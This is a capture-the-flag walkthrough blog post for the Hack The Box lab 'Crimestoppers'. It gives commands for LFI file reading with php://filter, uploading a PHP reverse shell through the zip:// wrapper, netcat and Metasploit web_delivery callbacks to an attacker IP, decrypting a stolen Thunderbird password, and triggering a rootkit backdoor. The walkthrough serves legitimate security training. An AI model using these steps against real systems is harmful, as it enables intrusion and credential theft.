@@ -1,0 +1,466 @@
+
+								
+																		Hack the Box Challenge: Crimestoppers Walkthrough
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on June 8, 2018
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									Today we are sharing our experience that can be helpful in solving new CTF challenge: Crimestoppers of Hack The Box. Solving this lab is not much easy, all you need is your penetration skill to solve this challenge.
+Level: Medium
+Task: Find the user.txt and root.txt in the vulnerable Lab.
+Penetrating Methodology
+
+Network Scanning
+Enumeration
+Exploiting Web Applications
+Capture user.txt
+Privilege Escalation
+Capture root.txt Flag
+
+Let’s Begin!!
+Network Scanning 
+These labs are only available online, therefore, they have a static IP. Crimestoppers has IP: 10.10.10.80.
+As we knew the initial stage is enumeration; therefore use nmap Aggressive scan for gathering target’s machine and running services information.
+
+		
+		
+			
+			
+			
+			
+nmap -A 10.10.10.80
+			
+				
+					
+				
+					1
+				
+						nmap -A 10.10.10.80
+					
+				
+			
+		
+
+
+Knowing port 80 was open on victim’s network we preferred to explore his IP in the browser and the following image opened as shown below.  Here, we can see that it has two pages: home and upload but didn’t find anything suspicious.
+
+Enumeration
+So next, we use the dirb tool of kali to enumerate the directories and found some important directories such as http://10.10.10.80/?op=view and went on the web browser to explore them.
+
+At upload, you can upload any comment as a Tip, in order to provide some information. So we try to upload malicious code here but get failed each time.
+If you will observe the URL http:// 10.10.10.80/?op=upload then you will realize that its look like that LFI.
+
+But it was not easy that much to exact information by exploiting LFI with help of ../etc/password therefore by making little bit more effort and taking help from my previous article. We used curl command to find out the data from inside it with the help of PHP base64-encode.
+
+		
+		
+			
+			
+			
+			
+curl http://10.10.10.80/?op=upload =php://filter/convert.base64-encode/resource=upload
+			
+				
+					
+				
+					1
+				
+						curl http://10.10.10.80/?op=upload =php://filter/convert.base64-encode/resource=upload
+					
+				
+			
+		
+
+As result, it returns base64 encode text which we need to decode.
+
+To decode base64 encoded text follow below syntax and found a PHP script that was pointing toward some kind of token and secretname which was a link to uploads directory.
+Syntax: echo BASE64TEXT | base64 -d
+
+After struggling a lot, finally, we successfully uploaded our PHP backdoor with help burp suite. Follow the given step to upload PHP web shell.
+Open php-reverse-shell.php which is inbuilt in Kali Linux from path: /user/share/webshells/php and modify ATTACKER’s IP and save this file on the desktop. Here we have renamed it as shell.php and compress this file.
+
+		
+		
+			
+			
+			
+			
+zip -0 shell.zip shell.php
+			
+				
+					
+				
+					1
+				
+						zip -0 shell.zip shell.php
+					
+				
+			
+		
+
+
+Exploiting Web Application
+In order to capture the request web browser, enter the information for Tips and name then turn burp suite and click on Send Tip.  
+
+Now in order to upload the content of our php backdoor through burp select the string “shell” for name = tip as shown below.
+
+And choose php file to paste it content at the place of shell.
+
+As you can observe that we have successfully uploaded our malicious PHP content here.
+
+Now forward the intercepted request and you will get secretname for the uploaded file as highlighted, copy it. Then forward the request again, it will give the success.txt message and at last forward the request one more time.
+
+Do not forget to launch netcat for reverse connection before executing your uploaded file.
+
+		
+		
+			
+			
+			
+			
+nc -lvp 1234
+			
+				
+					
+				
+					1
+				
+						nc -lvp 1234
+					
+				
+			
+		
+
+Now open the browser and execute the following command that contains secretname of the uploaded file (PHP backdoor) and you will get netcat session for reverse connection.
+
+		
+		
+			
+			
+			
+			
+http://10.10.10.80/?op=zip://uploads/10.10.14.25/e0d7a2f54d16633eb0eddfb10efed8ea5a200274%23shell
+python -c 'import pty; pty.spawn("/bin/sh")'
+			
+				
+					
+				
+					12
+				
+						http://10.10.10.80/?op=zip://uploads/10.10.14.25/e0d7a2f54d16633eb0eddfb10efed8ea5a200274%23shellpython -c 'import pty; pty.spawn("/bin/sh")'
+					
+				
+			
+		
+
+ 
+Because we love to work with meterpreter session therefore with help of Metasploit web_delivary module we generate malicious python code as shown.
+
+		
+		
+			
+			
+			
+			
+msf exploit(multi/script/web_delivery) &gt; set lhost 10.10.14.25
+msf exploit(multi/script/web_delivery) &gt; set srvhost 10.10.14.25
+msf exploit(multi/script/web_delivery) &gt; exploit
+			
+				
+					
+				
+					123
+				
+						msf exploit(multi/script/web_delivery) &gt; set lhost 10.10.14.25msf exploit(multi/script/web_delivery) &gt; set srvhost 10.10.14.25msf exploit(multi/script/web_delivery) &gt; exploit
+					
+				
+			
+		
+
+
+Paste copied code in netcat which will provide meterpreter session inside Metasploit framework.
+
+HURRAYYYY!!! We got our meterpreter session, now let’s grab the user.txt file first.
+Inside path: /home/dom I found user.txt file and used cat “filename” command for reading this file.
+
+		
+		
+			
+			
+			
+			
+cd home
+ls
+cd dom
+ls
+cat user.txt
+			
+				
+					
+				
+					12345
+				
+						cd homelscd domlscat user.txt
+					
+				
+			
+		
+
+Great!! We got our 1st flag successfully
+
+Privilege Escalation
+Now we need to find the root.txt file to finish this challenge and believe me it was not easy until you want the hint which is hidden by the author. We try every possible method to escalated privilege to gain the root access but it was quite different from previous experience.
+After penetrating more and more we found a “36jinndk.default” from inside /home/dom/.thunderbird, which was encrypted file for Thunderbird profile, therefore, we download it in our local system.
+
+		
+		
+			
+			
+			
+			
+meterpreter&gt; download 36jinndk.default /root/Desktop/36
+			
+				
+					
+				
+					1
+				
+						meterpreter&gt; download 36jinndk.default /root/Desktop/36
+					
+				
+			
+		
+
+
+Since it was encrypted file of Thunderbird profile so with help of Google we found a python script from this Link: https://github.com/unode/firefox_decrypt for its decryption.
+With help of the following command, we successfully found password: Gummer59
+
+		
+		
+			
+			
+			
+			
+python firefox_decrypt.py /root/Desktop/36
+			
+				
+					
+				
+					1
+				
+						python firefox_decrypt.py /root/Desktop/36
+					
+				
+			
+		
+
+
+We applied this password to the escalated user: dom with help of the following command and then move into crimestoppers.htb directory it looks like his mailbox directory where we found so many files such INBOX.
+
+		
+		
+			
+			
+			
+			
+su dome
+Password:
+cd /home/dom/.thunderbird/36jinndk.default/ImapMail/crimestoppers.htb
+			
+				
+					
+				
+					123
+				
+						su domePassword:cd /home/dom/.thunderbird/36jinndk.default/ImapMail/crimestoppers.htb
+					
+				
+			
+		
+
+
+First, we look into INBOX for any hint for root.txt but didn’t find something related to root.txt flag similarly we open other files but didn’t find anything.
+
+At last, we open Drafts-1 and read the following line which looks like a hint of root access.
+“I don’t trust them and run rkhunter, it reported that there a rootkit installed called:apache_modrootme backdoor” and its execution method.
+
+So we explore following the path and we found access.log.2.gz file since it was a compressed file, therefore, it was better to copy it inside /tmp for further steps.
+
+		
+		
+			
+			
+			
+			
+cd /var/log/apache2
+cp access.log.2.gz/tmp
+			
+				
+					
+				
+					12
+				
+						cd /var/log/apache2cp access.log.2.gz/tmp
+					
+				
+			
+		
+
+Now let’s move inside /tmp to extract the copied file inside it with the help of gunzip.
+
+		
+		
+			
+			
+			
+			
+gunzip access.log.2.gz
+ls
+cat access.log.2.gz
+			
+				
+					
+				
+					123
+				
+						gunzip access.log.2.gzlscat access.log.2.gz
+					
+				
+			
+		
+
+You can observe the log for a command “FunSociety” which has been executed several times.
+
+As per the message read from DRAFT-1 we run netcat on localhost on port 80 get root access with help of following commands when executed.
+
+		
+		
+			
+			
+			
+			
+nc localhost 80
+get FunSociety
+get FunSociety
+id
+			
+				
+					
+				
+					1234
+				
+						nc localhost 80get FunSocietyget FunSocietyid
+					
+				
+			
+		
+
+Now let’s get the root.txt and finish this task.
+
+		
+		
+			
+			
+			
+			
+cd /root
+cat root.txt
+			
+				
+					
+				
+					12
+				
+						cd /rootcat root.txt
+					
+				
+			
+		
+
+BOOOOOM!!!! We hit the Goal and completed both task.
+
+Author: AArti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
